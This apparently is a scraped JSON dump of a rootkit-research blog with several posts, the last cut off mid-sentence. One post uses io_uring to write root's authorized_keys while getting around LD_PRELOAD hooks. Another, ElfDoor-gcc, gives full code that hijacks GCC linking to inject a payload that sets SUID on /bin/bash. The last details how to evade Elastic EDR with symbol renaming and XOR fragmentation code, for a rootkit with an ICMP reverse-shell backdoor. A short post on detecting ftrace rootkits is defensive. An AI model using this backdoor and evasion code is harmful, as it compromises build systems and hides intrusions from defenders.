io_uring_queue_init(1, \u0026amp;ring, 0); This sets up the io_uring interface with a submission queue depth of 1 (meaning one submission queue entry at a time) and assigns the ring buffer context to ring. This sets up the shared memory structure used between userspace and kernel.\n2. Opening the Target File with open sqe = io_uring_get_sqe(\u0026amp;ring); io_uring_prep_open(sqe, AT_FDCWD, FILE_PATH, O_WRONLY | O_CREAT | O_TRUNC, 0644); This obtains a submission queue entry (SQE) and prepares an open. Unlike using libc\u0026rsquo;s open(), this is handed off directly to the kernel. The file /root/.ssh/authorized_keys will be opened in write-only mode, created if it doesn’t exist, and truncated if it does.\n3. Submitting the Request ret = io_uring_submit(\u0026amp;ring); All pending SQEs are submitted to the kernel. This includes the open operation we just prepared.\n4. Waiting for the Open to Complete ret = io_uring_wait_cqe(\u0026amp;ring, \u0026amp;cqe); fd = cqe-\u0026gt;res; Here we block until the kernel reports the result of the previous open operation. If successful, cqe-\u0026gt;res holds the file descriptor. Otherwise, it’s a negative errno value.\n5. Writing to the File iov.iov_base = (void *)content; iov.iov_len = content_len; io_uring_prep_writev(sqe, fd, \u0026amp;iov, 1, 0); We set up a writev with a single iovec structure pointing to our content buffer. Again, this bypasses libc and is submitted to the kernel through io_uring_submit().\n6. Closing the File Descriptor io_uring_prep_close(sqe, fd); This prepares a close syscall for the previously obtained file descriptor, cleaning up the resource after the write is complete.\n7. Cleanup io_uring_queue_exit(\u0026amp;ring); This releases all resources associated with the io_uring instance.\nThe complete execution is handled via direct syscall preparation and completion queues, meaning no libc API (like open(), write(), or close()) is ever invoked. This effectively bypasses userspace interception mechanisms based on dynamic linking and LD_PRELOAD.\nNo libc Call: Rootkits using LD_PRELOAD hook userland functions. io_uring interacts directly with the kernel. Kernel Submission: SQEs (Submission Queue Entries) are placed in a shared ring buffer and processed by the kernel, without invoking libc functions. No Function Symbol Interception: Since we never call open() or write() directly, dlsym(RTLD_NEXT, \u0026hellip;) never sees these calls. Security Implications While io_uring was designed for performance, it can also be abused as a stealthy vector to bypass userland monitoring. Malware or red team operators can leverage this interface to:\nInject backdoors undetected by LD_PRELOAD monitors Exfiltrate files or tamper with data covertly Operate beneath traditional EDR agents that rely on userland instrumentation Although this technique bypasses userland hooks, it does not evade kernel level security mechanisms such as LSM (Linux Security Modules) and () and eBPF. All I/O requests issued via io_uring are still subject to the same permission and inspection constraints enforced by the kernel, regardless of how they\u0026rsquo;re submitted. This is because io_uring still operates through the kernel\u0026rsquo;s I/O submission mechanism. Regardless of how I/O is submitted, via traditional syscalls or through io_uring, it still traverses the kernel and remains subject to kernel-level access control and monitoring\nFor example, LSMs like SELinux or AppArmor still validate access controls when files are opened or modified, regardless of whether the request came from io_uring or a traditional open() call. Similarly, eBPF-based monitors can observe and filter activity at the point where the kernel processes I/O requests.\nPOCs In the image above, see that no open() and openat() functions were used.\nConclusion io_uring offers more than just performance, it can also be abused as an anti-forensics or bypass technique when rootkits rely on userspace hooking mechanisms. Although powerful, its misuse should raise awareness of how modern kernel features can impact the offensive/defensive balance in Linux systems.\nBecome a part of Rootkit Researchers\nhttps://discord.gg/66N5ZQppU7 References https://kernel.dk/io_uring.pdf\n","permalink":"http://localhost:1313/hacking/using-io-uring-to-break-linux-rootkits-hooks/","summary":"\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://i.imgur.com/TGcNnzI.png\" alt=\"imgur\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eThis article explores a technique to bypass Userland based hooks, such as those implemented via LD_PRELOAD by leveraging io_uring, a modern Linux kernel interface for asynchronous I/O. By bypassing traditional libc wrappers, such as \u003ccode\u003eopen()\u003c/code\u003e, \u003ccode\u003ewrite()\u003c/code\u003e, and \u003ccode\u003eclose()\u003c/code\u003e, which are commonly intercepted in LD_PRELOAD based hooks, it\u0026rsquo;s possible to evade detection or interference by such malicious userspace mechanisms.\u003c/p\u003e\n\u003cp\u003eWe demonstrate this by comparing a simple LD_PRELOAD rootkit that hooks the \u003ccode\u003eopen()\u003c/code\u003e call with a program that uses io_uring to interact with the file system while still leveraging syscalls internally, io_uring minimizes user‑kernel transitions by batching operations through shared memory queues, issuing only a few essential syscalls (e.g., \u003ccode\u003eio_uring_enter\u003c/code\u003e, \u003ccode\u003eio_uring_setup\u003c/code\u003e) for coordination.\u003c/p\u003e","title":"breaking ld_preload rootkit hooks"},{"content":"Hello! Welcome to this post! Well, I have a server that is focused on rootkit research, both for Linux and Windows, feel free to come and participate in our community.\nhttps://discord.gg/66N5ZQppU7 What is Ftrace? ftrace (Function tracing) is a kernel function tracer. It helps a lot with debugging the Linux kernel, tracing functions, events, and of course, you can use ftrace to do hooking, etc.\nMain Features:\nFunction Tracing: Records kernel function calls, including order and execution time. Event Tracing: Monitors system events. Custom Filters: Focus on specific functions or events via configuration files. Support for dynamic tracers like kprobes and integration with tools like perf. On more current systems, tracing is enabled by default, but if not, simply set it:\nmount -t tracefs nodev /sys/kernel/tracing Ways to detect ftrace-based rootkits Detecting an LKM rootkit that uses ftrace is actually easier than you might think. If a rootkit uses ftrace, it is automatically detectable, because currently (at the time I am writing this post) there is no rootkit that I have seen that can hide from some tracing features.\nI will use the dreaded KoviD rootkit that uses ftrace as hooking.\nNow with KoviD loaded and hidden, we can begin.\nKoviD can be easily detected in /sys/kernel/tracing/enabled_functions, this file basically lists the kernel functions currently enabled for tracing.\nKoviD can also be detected in /sys/kernel/tracing/touched_functions, this file shows all functions that were every traced by ftrace or a direct trampoline (only for kernel 6.4+)\nin the current version of kovid, its functions do not appear in /sys/kernel/tracing/available_filter_functions, but it still leaves traces in this file, which basically lists kernel functions that can be filtered for tracing.\nNo ftrace based rootkit that I have seen so far can hide 100% and can be easily found, they always leave some trace behind.\nYou can also check my github repository, it contains several really cool things to detect and remove modern rootkits.\nCheat sheet: Detecting and Removing Linux Kernel Rootkit ","permalink":"http://localhost:1313/hacking/ftrace-rootkit/","summary":"\u003cp\u003eHello! Welcome to this post! Well, I have a server that is focused on rootkit research, both for Linux and Windows, feel free to come and participate in our community.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://discord.gg/66N5ZQppU7\"\u003ehttps://discord.gg/66N5ZQppU7\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"what-is-ftrace\"\u003eWhat is Ftrace?\u003c/h2\u003e\n\u003cp\u003eftrace (Function tracing) is a kernel function tracer. It helps a lot with debugging the Linux kernel, tracing functions, events, and of course, you can use ftrace to do hooking, etc.\u003c/p\u003e\n\u003cp\u003eMain Features:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eFunction Tracing: Records kernel function calls, including order and execution time.\u003c/li\u003e\n\u003cli\u003eEvent Tracing: Monitors system events.\u003c/li\u003e\n\u003cli\u003eCustom Filters: Focus on specific functions or events via configuration files.\u003c/li\u003e\n\u003cli\u003eSupport for dynamic tracers like kprobes and integration with tools like perf.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eOn more current systems, tracing is enabled by default, but if not, simply set it:\u003c/p\u003e","title":"Detecting rootkits based on ftrace hooking."},{"content":"Hijacking GCC with LD_PRELOAD Introduction If you\u0026rsquo;ve ever wondered how it\u0026rsquo;s possible to inject malicious code into binaries without touching the source code, and using only standard Linux tools, this article is for you. We\u0026rsquo;ll explore a very cool technique that intercepts the compilation process with LD_PRELOAD, modifying the commands executed and forcing the inclusion of a malicious library during linking.\nIn the end, the compiled binary looks legitimate, but it is infected with embedded malicious code, ready to be executed at the right time.\nThis is a simple project, with simple ideas and mechanisms, and it can certainly be improved.\nElfDoor-gcc repo: https://github.com/MatheuZSecurity/ElfDoor-gcc\nUnderstanding the Compilation Process with GCC Before attacking the compilation process, it\u0026rsquo;s essential to understand how it works\nGCC functions as more than a basic compiler; it operates as a kind of pipeline manager for multiple internal tools, depending on the requirements:\ngcc main.c -o main\nThis command has a sequence of steps:\nPreprocessing (cpp)\nExpands macros, includes header files, and removes comments.\nGenerates a .i file containing the \u0026ldquo;expanded\u0026rdquo; source code.\nCompilation (cc1)\nConverts the .i code into assembly.\nPerforms syntax and semantic checks, along with optimizations.\nAssembly (as)\nTranslates the assembly code into an object file (.o). Linkagem (collect2 → ld)\nCombines object files, resolves symbols, and produces the final binary.\ngcc invokes collect2, which in turn calls ld, the actual linker.\nThis final stage linking, is where the hijacking occurs. If we manage to intercept the moment when ld is invoked, we can modify its arguments and inject our own malicious library\nAttack Chain The core concept is to leverage LD_PRELOAD to override critical functions like execve and posix_spawn, enabling us to intercept process execution.\nOur project will consist of:\nmain.c: Hooks execve and posix_spawn, inspects the arguments, and, if appropriate, injects parameters to include our malicious library.\nb.a: The library containing the malicious code we want to embed in the final binary\nInstall.sh: Compiles and loads our malicious LD_PRELOAD.\nhello.c: A simple program that just prints \u0026ldquo;Hello,\u0026rdquo; but after compiling and executing, it will run our malicious code.\nElfDoor Hooks The main.c file is responsible for hooking process execution functions, such as execve and posix_spawn, to inject a malicious static library called b.a into the binary compilation process. This technique allows any binary generated on a compromised machine to carry a \u0026ldquo;hidden\u0026rdquo; payload without the developer noticing.\nThe structure starts with the inclusion of the essential libraries:\n#define _GNU_SOURCE #include \u0026lt;dlfcn.h\u0026gt; #include \u0026lt;spawn.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; extern char **environ; The use of _GNU_SOURCE is essential to enable GNU libc specific extensions, such as the interception of execve and posix_spawn. Including \u0026lt;dlfcn.h\u0026gt; allows the use of dlsym, which is crucial for obtaining pointers to the original functions and diverting execution.\nNext, we have auxiliary functions responsible for determining if the running binary is relevant. For example, is_gcc detects whether the binary being executed is the GCC, cc, or clang compiler:\nint is_gcc(const char *path) { const char *progname = strrchr(path, \u0026#39;/\u0026#39;); progname = progname ? progname + 1 : path; return strcmp(progname, \u0026#34;gcc\u0026#34;) == 0 || strcmp(progname, \u0026#34;cc\u0026#34;) == 0 || strcmp(progname, \u0026#34;clang\u0026#34;) == 0; } The code above extracts the program name from the full path (e.g., /usr/bin/gcc) and directly compares it with known compiler names. The same pattern is used to identify collect2 and ld in the is_collect2 and is_linker functions.\nThen, the should_inject function determines whether the injection should occur, based on the compiler arguments:\nint should_inject(char *const argv[]) { for (int i = 0; argv[i]; ++i) { if (strcmp(argv[i], \u0026#34;-c\u0026#34;) == 0 || strcmp(argv[i], \u0026#34;-E\u0026#34;) == 0 || strcmp(argv[i], \u0026#34;-S\u0026#34;) == 0) return 0; } return 1; } These flags (-c, -E, -S) are used in intermediate compilation processes that do not generate final executables. Since the goal is to inject code into the final binary, these modes are ignored.\nThe most important function is inject_args, which constructs a new argument list by inserting the static library:\nchar **inject_args(const char *bin_path, char *const argv[], int extra) { int argc; for (argc = 0; argv[argc]; ++argc); const char *lib_path = \u0026#34;/dev/shm/b.a\u0026#34;; for (int i = 0; i \u0026lt; argc; ++i) { if (argv[i] \u0026amp;\u0026amp; strstr(argv[i], \u0026#34;b.a\u0026#34;) != NULL) { return NULL; } } const char **new_argv = malloc(sizeof(char *) * (argc + extra + 1)); if (!new_argv) return NULL; int i = 0, j = 0; for (; i \u0026lt; argc; ++i) new_argv[j++] = argv[i]; const char *arg1, *arg2, *arg3; if (is_gcc(bin_path)) { arg1 = \u0026#34;-Wl,--whole-archive\u0026#34;; arg2 = lib_path; arg3 = \u0026#34;-Wl,--no-whole-archive\u0026#34;; } else { arg1 = \u0026#34;--whole-archive\u0026#34;; arg2 = lib_path; arg3 = \u0026#34;--no-whole-archive\u0026#34;; } new_argv[j++] = arg1; new_argv[j++] = arg2; new_argv[j++] = arg3; new_argv[j] = NULL; return (char **)new_argv; } The inject_args function modifies a program\u0026rsquo;s argument list by conditionally adding a static library (/dev/shm/b.a), depending on the binary, and prevents duplication of this library in the list.\nThe hooking of execve happens as follows:\nint execve(const char *pathname, char *const argv[], char *const envp[]) { static int (*real_execve)(const char *, char *const [], char *const []) = NULL; if (!real_execve) real_execve = dlsym(RTLD_NEXT, \u0026#34;execve\u0026#34;); if ((is_gcc(pathname) || is_collect2(pathname) || is_linker(pathname)) \u0026amp;\u0026amp; should_inject(argv)) { char **new_argv = inject_args(pathname, argv, 3); if (new_argv) { int result = real_execve(pathname, new_argv, envp); free(new_argv); return result; } } return real_execve(pathname, argv, envp); } When the process attempts to execute gcc, ld, or similar, the execve hook intercepts the call. It calls the inject_args function to modify the arguments, and if the modification is successful, it executes the binary with the new argument list. The original execve function is called via the pointer obtained with dlsym, ensuring that the actual call still happens, but with the malicious code included.\nFinally, the posix_spawn function is handled with identical logic:\nint posix_spawn(pid_t *pid, const char *path, const posix_spawn_file_actions_t *file_actions, const posix_spawnattr_t *attrp, char *const argv[], char *const envp[]) { static int (*real_posix_spawn)(pid_t *, const char *, const posix_spawn_file_actions_t *, const posix_spawnattr_t *, char *const [], char *const []) = NULL; if (!real_posix_spawn) real_posix_spawn = dlsym(RTLD_NEXT, \u0026#34;posix_spawn\u0026#34;); if ((is_gcc(path) || is_collect2(path) || is_linker(path)) \u0026amp;\u0026amp; should_inject(argv)) { char **new_argv = inject_args(path, argv, 3); if (new_argv) { int result = real_posix_spawn(pid, path, file_actions, attrp, new_argv, envp); free(new_argv); return result; } } return real_posix_spawn(pid, path, file_actions, attrp, argv, envp); } This hook ensures that even when gcc or ld use posix_spawn internally, the malicious library will still be injected. It is a layer of compatibility that makes the our malware even more effective.\nThe entire mechanism is activated when the library compiled with this main.c is loaded via LD_PRELOAD, a legitimate Linux feature used to replace functions from standard libraries. Any compilation performed on the system can be automatically compromised.\nMalicious code: b.c The purpose of the b.c code is to modify the permissions of /bin/bash to allow it to be executed with elevated privileges.\n#include \u0026lt;unistd.h\u0026gt; #include \u0026lt;sys/stat.h\u0026gt; __attribute__((constructor)) void backdoor() { chmod(\u0026#34;/bin/bash\u0026#34;, 04755); } In other words, as soon as some code is compiled using GCC, for example, it will inject our backdoor inside, and if executed as root, it will set the SUID on /bin/bash.\nPOC Conclusion With this simple hook, we’re able to intercept GCC’s compilation pipeline and inject a malicious library during the linking stage, all without modifying the source code.\nThe result is a seemingly legitimate binary that silently carries a hidden payload, ready to be executed.\nPlease feel free to contact me on Twitter if you have any questions.\nRootkit Researchers\n","permalink":"http://localhost:1313/hacking/gcc/","summary":"\u003ch1 id=\"hijacking-gcc-with-ld_preload\"\u003eHijacking GCC with LD_PRELOAD\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://i.imgur.com/MmPbrjL.png\" alt=\"imgur\"  /\u003e\n\u003c/p\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIf you\u0026rsquo;ve ever wondered how it\u0026rsquo;s possible to inject malicious code into binaries \u003cstrong\u003ewithout touching the source code\u003c/strong\u003e, and using only standard Linux tools, this article is for you. We\u0026rsquo;ll explore a very cool technique that intercepts the compilation process with LD_PRELOAD, modifying the commands executed and forcing the inclusion of a malicious library during \u003cstrong\u003elinking\u003c/strong\u003e.\u003c/p\u003e\n\u003cp\u003eIn the end, the compiled binary looks legitimate, but it is infected with embedded malicious code, ready to be executed at the right time.\u003c/p\u003e","title":"ElfDoor-gcc"},{"content":" Stealthy Kernel Rootkit: https://github.com/MatheuZSecurity/Singularity\nRootkit Researchers: https://discord.gg/66N5ZQppU7\nIntroduction Security solutions continue to intensify. Modern EDRs like Elastic Security, integrated with Elastic Defend, employ multiple detection layers including YARA signatures and behavioral analysis to identify Linux kernel rootkits, triggering 26+ alerts on a single malicious module.\nThis article demonstrates how to systematically evade these defenses. We present a comprehensive case study of developing a Linux rootkit that successfully bypasses Elastic Security\u0026rsquo;s detection mechanisms through obfuscation, fragmentation, and staged execution techniques. All content is strictly for educational purposes only.\nTable of Contents Introduction Understanding the Threat Landscape: Elastic YARA Rules Primary Detection Rules Detection Signature Analysis The Singularity Rootkit: Capabilities Overview Core Features Evasion Technique 1: Symbol Name Randomization The Problem The Solution: Intelligent Name Randomization Evasion Technique 2: Module Fragmentation The Problem The Solution: Fragment + XOR Encoding + In-Memory Loading Custom Loader via memfd_create Evasion Technique 3: Ftrace Helper Obfuscation The Problem The Solution: Rename Ftrace Framework Functions Build Pipeline: Automated Obfuscation Workflow Final Test: Successful Evasion Bonus: Compilation Path Detection Bypass Bonus 2: Bypassing Elastic Behavioral Detection for Reverse Shells Conclusion Understanding the Threat Landscape: Elastic YARA Rules In a default environment with the Elastic agent installed, attempting to compile and load the Singularity rootkit results in immediate detection and files removed. The kernel object is automatically deleted and isolated in quarantine before it can be loaded into the kernel.\nThere were approximately 26 detections.\nUpon investigation, I identified the specific Elastic YARA rules detecting our rootkit:\nPrimary Detection Rules Linux_Rootkit_BrokePKG.yar\nLinux_Rootkit_Generic.yar\nLinux_Rootkit_Generic_61229bdf - Detects common rootkit patterns and function names Linux_Rootkit_Generic_482bca48 - Targets suspicious prefixes and hook patterns Linux_Rootkit_Generic_d0c5cfe0 - Detects initialization and hooking combinations Linux_Rootkit_Generic_f07bcabe - Identifies ftrace helper functions Linux_Rootkit_Generic_5d17781b - Targets license strings combined with kallsyms Linux_Rootkit_BrokePKG_7b7d4581 - Specific patterns from known rootkits Detection Signature Analysis Generic Rootkit Detection (61229bdf) Targets: hide_module, hook_getdents, orig_kill, fake_tcp4_seq_show, etc. Condition: 4 or more matching strings Total patterns: 57 distinct function names Hook Pattern Detection (482bca48) System strings: sys_call_table, kallsyms_lookup_name, kprobe Rootkit prefixes: rootkit, hide_, hacked_, fake_, hooked_ Hook suffixes: _getdents, _kill, _tcp4_seq_show, _udp4_seq_show Condition: 3 system strings AND (all prefixes OR 3 prefixes + 5 hooks) License String Detection (5d17781b) Targets: kallsyms_lookup_name_t + \u0026#34;license=GPL\u0026#34; Condition: Both strings must be present Purpose: Detects ftrace-based rootkits using kallsyms Ftrace Helper Detection (f07bcabe) Targets: - fh_install_hook - fh_remove_hook - fh_resolve_hook_address Condition: 2 or more matching strings BrokePKG Specific Detection (7b7d4581) License strings: - author=R3tr074 - name=brokepkg - description=Rootkit - license=GPL Specific strings: - brokepkg - brokepkg: module revealed - br0k3_n0w_h1dd3n Hook patterns: - nf_inet_hooks - ftrace_hook - hook_getdents - hook_kill - orig_tcp4_seq_show Condition: 3 license strings OR 2 specific strings OR 4 hook patterns Since our rootkit utilizes ftrace for syscall hooking, it naturally contains many of these patterns. The challenge becomes: how do we maintain functionality while evading static signature detection?\nThe Singularity Rootkit: Capabilities Overview Source: https://github.com/MatheuZSecurity/Singularity\nBefore diving into evasion techniques, let\u0026rsquo;s understand what the Singularity rootkit accomplishes:\nCore Features Process Hiding: Hides processes from /proc. File and Directory Hiding: Conceals files matching specific patterns (singularity, obliviate, matheuz, zer0t, etc.) Network Hiding: Hides TCP connections on port 8081 from netstat and packet capture tools Privilege Escalation: Provides root access via signal 59 (kill -59 ) or environment variable (MAGIC=mtz) ICMP Backdoor: Triggers reverse shell via magic ICMP packets (sequence 1337) Anti-Analysis Features:\nBlocks BPF programs and tracing Prevents ftrace manipulation by other users Disables module loading via init_module/finit_module hooks Filters /proc/kallsyms, /proc/modules, and tracefs Taint Clearing: Resets kernel taint flags to hide unsigned module loading Log Sanitization: Filters kernel logs (dmesg, /var/log/kern.log) to remove traces of the rootkit Module Stealth: Self-hiding from lsmod and /sys/module directory Evasion Technique 1: Symbol Name Randomization The Problem Rootkits typically use predictable naming patterns that become signatures:\nhook_getdents64 fake_tcp4_seq_show hide_module orig_kill hacked_open hooked_read Elastic\u0026rsquo;s YARA rules (61229bdf, 482bca48, d0c5cfe0) specifically target these prefixes:\n$rk1 = \u0026#34;rootkit\u0026#34; $rk2 = \u0026#34;hide_\u0026#34; $rk3 = \u0026#34;hacked_\u0026#34; $rk4 = \u0026#34;fake_\u0026#34; $rk5 = \u0026#34;hooked_\u0026#34; $hook1 = \u0026#34;_getdents\u0026#34; $hook2 = \u0026#34;_kill\u0026#34; $hook3 = \u0026#34;_tcp4_seq_show\u0026#34; The Solution: Intelligent Name Randomization Our Python obfuscator generates kernel-like generic names that blend in with legitimate kernel code:\ndef _generate_random_name(self) -\u0026gt; str: \u0026#34;\u0026#34;\u0026#34;Generates random name that avoids YARA patterns\u0026#34;\u0026#34;\u0026#34; # Avoid suspicious prefixes: hook_, fake_, hide_, hacked_, hooked_, orig_ # Use generic names that look legitimate prefixes = [\u0026#39;sys\u0026#39;, \u0026#39;kern\u0026#39;, \u0026#39;dev\u0026#39;, \u0026#39;mm\u0026#39;, \u0026#39;fs\u0026#39;, \u0026#39;net\u0026#39;, \u0026#39;proc\u0026#39;, \u0026#39;sched\u0026#39;] suffixes = [\u0026#39;handler\u0026#39;, \u0026#39;helper\u0026#39;, \u0026#39;worker\u0026#39;, \u0026#39;ops\u0026#39;, \u0026#39;func\u0026#39;, \u0026#39;entry\u0026#39;, \u0026#39;cb\u0026#39;] prefix = random.choice(prefixes) suffix = random.choice(suffixes) middle = \u0026#39;\u0026#39;.join(random.choices(string.ascii_lowercase, k=random.randint(3, 6))) return f\u0026#34;{prefix}_{middle}_{suffix}\u0026#34; Key Features No suspicious prefixes (hook_, fake_, hide_) Looks like legitimate kernel code Maintains internal consistency via mapping file Protects kernel API calls from renaming Protected Names The obfuscator maintains a whitelist of kernel API functions that must NOT be renamed:\ndef _get_protected_names(self) -\u0026gt; Set[str]: \u0026#34;\u0026#34;\u0026#34;Names from kernel that should NOT be changed\u0026#34;\u0026#34;\u0026#34; return { # Basic C types \u0026#39;int\u0026#39;, \u0026#39;void\u0026#39;, \u0026#39;long\u0026#39;, \u0026#39;char\u0026#39;, \u0026#39;size_t\u0026#39;, \u0026#39;ssize_t\u0026#39;, # Essentials \u0026#39;module_init\u0026#39;, \u0026#39;module_exit\u0026#39;, \u0026#39;THIS_MODULE\u0026#39;, \u0026#39;current\u0026#39;, \u0026#39;kmalloc\u0026#39;, \u0026#39;kfree\u0026#39;, \u0026#39;printk\u0026#39;, \u0026#39;pr_debug\u0026#39;, \u0026#39;copy_from_user\u0026#39;, \u0026#39;copy_to_user\u0026#39;, \u0026#39;fget\u0026#39;, \u0026#39;fput\u0026#39;, \u0026#39;kernel_read\u0026#39;, # Structures \u0026#39;pt_regs\u0026#39;, \u0026#39;file\u0026#39;, \u0026#39;task_struct\u0026#39;, \u0026#39;sk_buff\u0026#39;, # Entry points \u0026#39;main\u0026#39;, \u0026#39;init\u0026#39;, \u0026#39;exit\u0026#39;, } Function Name Extraction The obfuscator scans source files for function definitions using multiple regex patterns:\nself.function_patterns = [ r\u0026#39;\\bnotrace\\s+(?:static\\s+)?(?:int|void|long|bool|ssize_t|asmlinkage)\\s+(\\w+)\\s*\\(\u0026#39;, r\u0026#39;\\bstatic\\s+(?:notrace\\s+)?(?:int|void|long|bool|ssize_t|asmlinkage)\\s+(\\w+)\\s*\\(\u0026#39;, r\u0026#39;\\bstatic\\s+asmlinkage\\s+\\w+\\s+(\\w+)\\s*\\(\u0026#39;, r\u0026#39;\\basmlinkage\\s+\\w+\\s+\\*?\\(?\\*?(\\w+)\\)?\u0026#39;, r\u0026#39;\\b(\\w+_init)\\s*\\(\\s*void\\s*\\)\u0026#39;, r\u0026#39;\\b(\\w+_exit)\\s*\\(\\s*void\\s*\\)\u0026#39;, r\u0026#39;\\bHOOK\\s*\\([^,]+,\\s*(\\w+)\\s*,\u0026#39;, r\u0026#39;\\btypedef\\s+[^;]+\\s+(\\w+_t)\\s*;\u0026#39;, ] Example Transformation Before:\n// modules/hiding_directory.c static notrace long hook_getdents64(const struct pt_regs *regs) { long res = orig_getdents64(regs); // ... } static notrace long hook_getdents(const struct pt_regs *regs) { long res = orig_getdents(regs); // ... } After:\n// obfuscated/modules/hiding_directory.c static notrace long sys_abjker_handler(const struct pt_regs *regs) { long res = kern_wopqls_helper(regs); // ... } static notrace long fs_tnmqlk_ops(const struct pt_regs *regs) { long res = net_xzpnrm_func(regs); // ... } Implementation Details def _replace_in_content(self, content: str, mapping: Dict[str, str]) -\u0026gt; str: \u0026#34;\u0026#34;\u0026#34;Replace names in content\u0026#34;\u0026#34;\u0026#34; modified = content # Sort by descending length to avoid partial substitutions sorted_items = sorted(mapping.items(), key=lambda x: len(x[0]), reverse=True) for old_name, new_name in sorted_items: # Use word boundary for exact substitution pattern = r\u0026#39;\\b\u0026#39; + re.escape(old_name) + r\u0026#39;\\b\u0026#39; modified = re.sub(pattern, new_name, modified) return modified The key insight: we sort by length descending to prevent partial matches. For example, if we have both hook_kill and hook_kill_ex, we must replace hook_kill_ex first to avoid breaking it into sys_abc_handler_ex.\nEvasion Technique 2: Module Fragmentation The Problem EDR solutions scan loaded kernel modules primarily on disk. A monolithic .ko file presents a single attack surface that\u0026rsquo;s easy to analyze:\nSignature scanning of the entire module on disk Static analysis of ELF structure Symbol table enumeration String pattern detection (including \u0026ldquo;GPL\u0026rdquo;, \u0026ldquo;kallsyms_lookup_name\u0026rdquo;, etc.) The Solution: Fragment + XOR Encoding + Ephemeral In-Memory Loading We split the compiled module into encrypted chunks that are only reassembled in memory during loading. This technique breaks static disk-based analysis while maintaining functionality.\nHow This Evades Detection The evasion works through a multi-layered approach:\nDisk-Based YARA Evasion: XOR encoding breaks string signatures in stored fragments Ephemeral Reconstruction: The complete module exists in plaintext only briefly in a temporary memfd Self-Hiding Post-Load: The rootkit immediately conceals itself after loading Important Technical Note: After XOR decoding during the load process, strings like \u0026ldquo;GPL\u0026rdquo; and \u0026ldquo;kallsyms_lookup_name\u0026rdquo; are restored to plaintext in memory. However, Elastic\u0026rsquo;s YARA rules primarily scan files on disk, not ephemeral memory structures. The combination of:\nXOR-encoded fragments on disk (unreadable to YARA) Millisecond-duration plaintext in anonymous memfd (difficult to scan) Immediate self-hiding after module load (invisible to subsequent analysis) \u0026hellip;creates an effective evasion without requiring permanent string obfuscation in memory.\nFragmentation Pipeline: def fragment(self, chunk_size: int = 65536, encode: bool = True) -\u0026gt; List[bytes]: \u0026#34;\u0026#34;\u0026#34; Fragment the .ko into chunks Args: chunk_size: Size of each fragment (default: 64KB) encode: If True, apply XOR encoding Returns: List of fragments \u0026#34;\u0026#34;\u0026#34; print(f\u0026#34;\\n[*] Fragmenting: {self.ko_path}\u0026#34;) print(f\u0026#34; Chunk size: {chunk_size} bytes\u0026#34;) # Read the .ko file with open(self.ko_path, \u0026#39;rb\u0026#39;) as f: ko_data = f.read() original_size = len(ko_data) print(f\u0026#34;[+] Original size: {original_size} bytes\u0026#34;) # Generate random XOR key xor_key = os.urandom(16) if encode else b\u0026#39;\\x00\u0026#39; * 16 # Fragment fragments = [] num_chunks = (original_size + chunk_size - 1) // chunk_size for i in range(num_chunks): start = i * chunk_size end = min(start + chunk_size, original_size) chunk = ko_data[start:end] # Apply encoding if necessary if encode: chunk = self._xor_encode(chunk, xor_key) fragments.append(chunk) checksum = self._calculate_checksum(chunk) print(f\u0026#34;[+] Fragment {i+1}/{num_chunks}: {len(chunk)} bytes (SHA256: {checksum[:16]}...)\u0026#34;) self.fragments = fragments # Metadata self.metadata = { \u0026#39;original_filename\u0026#39;: self.ko_path.name, \u0026#39;original_size\u0026#39;: original_size, \u0026#39;num_fragments\u0026#39;: len(fragments), \u0026#39;chunk_size\u0026#39;: chunk_size, \u0026#39;encoded\u0026#39;: encode, \u0026#39;xor_key\u0026#39;: xor_key.hex() if encode else None, \u0026#39;checksums\u0026#39;: [self._calculate_checksum(f) for f in fragments] } return fragments XOR Encoding We use a simple but effective XOR cipher with a random 16-byte key:\ndef _xor_encode(self, data: bytes, key: bytes) -\u0026gt; bytes: \u0026#34;\u0026#34;\u0026#34;Simple XOR encoding for obfuscation\u0026#34;\u0026#34;\u0026#34; encoded = bytearray() key_len = len(key) for i, byte in enumerate(data): encoded.append(byte ^ key[i % key_len]) return bytes(encoded) While XOR is cryptographically weak, it serves our purpose for disk-based evasion:\nBreaks signature matching in files stored on disk Fast to encode/decode Minimal overhead Easy to implement in C loader Evasion Layer Breakdown ┌─────────────────────────────────────────────────────────────────┐ │ LAYER 1: Fragments on Disk (XOR Encoded) │ ├─────────────────────────────────────────────────────────────────┤ │ Status: YARA cannot detect signatures │ │ Reason: All bytes are XOR\u0026#39;ed, \u0026#34;GPL\u0026#34; appears as random bytes │ │ │ │ # Before encoding │ │ strings singularity.ko | grep \u0026#34;GPL\u0026#34; │ │ license=GPL │ │ │ │ # After encoding │ │ strings fragments/chunk_000.bin | grep \u0026#34;GPL\u0026#34; │ │ (no results - bytes are obfuscated) │ └─────────────────────────────────────────────────────────────────┘ ┌─────────────────────────────────────────────────────────────────┐ │ LAYER 2: Ephemeral memfd (Plaintext - Milliseconds) │ ├─────────────────────────────────────────────────────────────────┤ │ Status: Strings are restored to plaintext │ │ Reason: XOR decode happens during reconstruction │ │ │ │ Timeline: │ │ T+0ms: memfd created │ │ T+5ms: fragments decoded and written │ │ T+10ms: finit_module() called │ │ T+15ms: memfd closed and deleted │ │ │ │ Detection Window: ~15 milliseconds │ │ Elastic Challenge: Must scan anonymous memfd in real-time │ └─────────────────────────────────────────────────────────────────┘ ┌─────────────────────────────────────────────────────────────────┐ │ LAYER 3: Loaded Module (Plaintext but Hidden) │ ├─────────────────────────────────────────────────────────────────┤ │ Status: Strings exist in kernel memory │ │ Reason: Module is loaded normally │ │ │ │ Rootkit Self-Hiding: │ │ ✓ Hidden from lsmod │ │ ✓ Hidden from /sys/module │ │ ✓ Filters /proc/kallsyms │ │ ✓ Filters /proc/modules │ │ ✓ Blocks BPF and tracing │ │ │ │ Result: Invisible to analysis tools │ └─────────────────────────────────────────────────────────────────┘ Why Elastic Doesn\u0026rsquo;t Detect This YARA primarily scans disk files\nFragments are XOR\u0026rsquo;ed and broken 